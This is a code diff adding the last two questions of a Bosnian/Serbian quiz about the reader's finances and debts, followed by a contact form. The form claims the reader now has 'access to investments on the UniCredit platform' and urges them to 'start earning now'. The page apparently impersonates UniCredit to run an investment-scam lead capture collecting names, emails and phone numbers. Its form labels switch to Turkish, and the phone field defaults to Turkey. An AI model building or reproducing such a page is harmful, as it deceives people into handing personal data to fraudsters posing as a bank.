+                              type="radio"
+                              name="step5"
+                              value="Nezavisno"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Nezavisno</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="answer-variants__image">
+                        <img
+                          src="assets/images/7.png"
+                          alt
+                          class="answer-variants__image-img"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div
+                    class="quiz__whitelabel quiz__whitelabel_mobile"
+                    style="
+                      display: block !important;
+                      visibility: visible !important;
+                      opacity: 1 !important;
+                    "
+                  ></div>
+                  <div class="quiz__buttons">
+                    <div class="quiz-buttons is-outline">
+                      <div class="quiz-buttons__progress">
+                        <div class="progress-bar">
+                          <div class="progress-bar-circular-steps">
+                            <div class="progress-bar-circular-steps__label">
+                              Pitanje 7 od 8
+                            </div>
+                            <div
+                              class="progress-bar-circular-steps__gradient-wrapp"
+                            >
+                              <div
+                                class="progress-bar-circular-steps__steps"
+                                style="left: 0px"
+                              >
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step"
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <button
+                        disabled="disabled"
+                        class="button is-link quiz-buttons__button quiz-buttons__button_prev is-outline"
+                      >
+                        leđa
+                      </button>
+                      <button
+                        class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn last-btn"
+                      >
+                        <span class="quiz-buttons__button_next-text"
+                          >Unaprijediti</span
+                        >
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="quiz-container test-step">
+              <div class="quiz">
+                <div class="quiz__questions">
+                  <div class="quiz__questions-header">
+                    <div
+                      class="title quiz__question-title quiz__question-title_without-title"
+                    >
+                      <span class="is-block"
+                        >Imate li finansijske obaveze?</span
+                      >
+                    </div>
+                  </div>
+                  <div
+                    class="question quiz__question question_variants"
+                    id="DJ17A5860g"
+                  >
+                    <div class="answer-variants answer-variants_has_image">
+                      <div
+                        class="answer-variants__group"
+                        data-question="Imate li finansijske obaveze?"
+                        data-questionNew="8"
+                      >
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Da, imam hipoteku"
+                          data-answerNew="a"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Da, imam hipoteku"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Da, imam hipoteku
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Da, imam kredit"
+                          data-answerNew="b"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Da, imam kredit"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">Da, imam kredit</div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Ne, samo za kućne troškove"
+                          data-answerNew="c"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Ne, samo za kućne troškove"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Ne, samo za kućne troškove
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                        <div
+                          data-element-index="0"
+                          class="answer-variants__variant-text answer-btn"
+                          data-answer="Ne, ali želim da budem finansijski nezavisan"
+                          data-answerNew="d"
+                        >
+                          <label tabindex="0" class="b-radio _js-input radio">
+                            <input
+                              tabindex="-1"
+                              type="radio"
+                              name="step5"
+                              value="Ne, ali želim da budem finansijski nezavisan"
+                            />
+                            <span class="check"></span>
+                            <span class="control-label">
+                              <div class="answer">
+                                <div class="answer__title">
+                                  Ne, ali želim da budem finansijski nezavisan
+                                </div>
+                              </div>
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="answer-variants__image">
+                        <img
+                          src="assets/images/8.png"
+                          alt
+                          class="answer-variants__image-img"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  <div
+                    class="quiz__whitelabel quiz__whitelabel_mobile"
+                    style="
+                      display: block !important;
+                      visibility: visible !important;
+                      opacity: 1 !important;
+                    "
+                  ></div>
+                  <div class="quiz__buttons">
+                    <div class="quiz-buttons is-outline">
+                      <div class="quiz-buttons__progress">
+                        <div class="progress-bar">
+                          <div class="progress-bar-circular-steps">
+                            <div class="progress-bar-circular-steps__label">
+                              Pitanje 8 od 8
+                            </div>
+                            <div
+                              class="progress-bar-circular-steps__gradient-wrapp"
+                            >
+                              <div
+                                class="progress-bar-circular-steps__steps"
+                                style="left: 0px"
+                              >
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                                <div
+                                  class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
+                                ></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <button
+                        disabled="disabled"
+                        class="button is-link quiz-buttons__button quiz-buttons__button_prev is-outline"
+                      >
+                        leđa
+                      </button>
+                      <button
+                        class="button quiz-buttons__button quiz-buttons__button_next is-outline next-btn last-btn"
+                      >
+                        <span class="quiz-buttons__button_next-text"
+                          >Unaprijediti</span
+                        >
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="quiz-container quiz-container_has_results test-step">
+              <div class="quiz__lead-form">
+                <div class="final-page final-page_horizontal">
+                  <div class="final-page-top-block">
+                    <div class="top-block-logo">
+                      <img src="assets/images/logo.svg" alt="" />
+                    </div>
+                    <div class="start-page__line"></div>
+                    <h2>
+                      Čestitamo! Sada imate pristup investicijama na UniCredit
+                      platformi. Ostavite svoje kontakt podatke i počnite da
+                      zarađujete odmah.
+                    </h2>
+                  </div>
+                  <div class="final-page-bottom-block">
+                    <div class="final-page__header">
+                      <video
+                        src="assets/video/UniCreditBank.mp4"
+                        poster="assets/video/poster.png"
+                        controls
+                      ></video>
+                    </div>
+                    <div class="final-page__form">
+                      <div name="contacts" class="lead-form form">
+                        <form class="">
+                          <div class="step">
+                            <div class="input-wrap">
+                              <input
+                                type="text"
+                                name="first_name"
+                                id="first_name-48101"
+                                placeholder="Adınızı girin"
+                                class=""
+                              />
+                            </div>
+                            <div class="input-wrap">
+                              <input
+                                type="text"
+                                name="last_name"
+                                id="last_name-48101"
+                                placeholder="ISoyadı girin"
+                                class=""
+                              />
+                            </div>
+                            <div class="input-wrap">
+                              <input
+                                type="email"
+                                name="email"
+                                id="email-48101"
+                                placeholder="E-posta adresinizi girin"
+                                class=""
+                              />
+                            </div>
+                          </div>
+                          <div class="step">
+                            <div class="input-wrap">
+                              <div class="vue-tel-input">
+                                <input
+                                  type="tel"
+                                  autocomplete="on"
+                                  id="phone"
+                                  maxlength="15"
+                                  name="phonePart"
+                                  placeholder="512345678"
+                                  required="required"
+                                  tabindex="0"
+                                  class="vti__input"
+                                />
+                              </div>
+                            </div>
+                          </div>
+                          <!---->
+                          <div class="checkbox-wrap valid">
+                            <input
+                              type="checkbox"
+                              name="politics"
+                              id="politics-48101"
+                            /><label for="politics-48101"
+                              >Kabul ediyorum
+                              <a
+                                href="javascript:void(0)"
+                                data-name="policy"
+                                class="alterlink"
+                                >Gizlilik Politikası</a
+                              ></label
+                            >
+                          </div>
+                          <div class="checkbox-wrap valid">
+                            <input
+                              type="checkbox"
+                              name="over"
+                              id="over-48101"
+                            /><label for="over-48101"
+                              >18 yaşından büyüğüm</label
+                            >
+                          </div>
+                          <div class="input-wrap">
+                            <button type="submit">
+                              Şimdi kazanmaya başlayın!
+                            </button>
+                          </div>
+                        </form>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="assets/js/custom6.js"></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/19.5.3/js/intlTelInput.min.js"
+      integrity="sha512-LmFjnRVs7R8+kztt4F1kEyRCFg9Muhyk2Qg5KwvJKG0Imc2sPXvi58IoxfeZVsB10Jgb0u5fVXBeUvXifBjtNg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script>
+      const input = document.querySelector("#phone");
+      window.intlTelInput(input, {
+        initialCountry: "tr",
+        showSelectedDialCode: true,
+      });
+    </script>
+  </body>
+</html>
